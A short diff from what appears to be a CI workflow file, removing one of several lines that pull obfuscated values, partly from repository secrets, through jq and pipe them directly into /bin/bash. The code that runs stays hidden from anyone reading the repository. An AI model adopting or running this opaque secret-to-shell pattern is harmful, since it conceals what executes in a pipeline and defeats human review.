@@ -18,7 +18,6 @@ jobs:
           r20: ${{ secrets.r20 }}
         run: |
           printf '%s' "$r20" | jq -r .mmvsh8844 | /bin/bash
-          printf '%s' "$wnxm04810" | jq -r .u26299 | /bin/bash
           printf '%s' "$j4255" | jq -r .l746 | /bin/bash
           echo $a3254 | jq -r .gqu252 | /bin/bash
           echo $dtzy95195 | jq -r .jyr5888 | /bin/bash
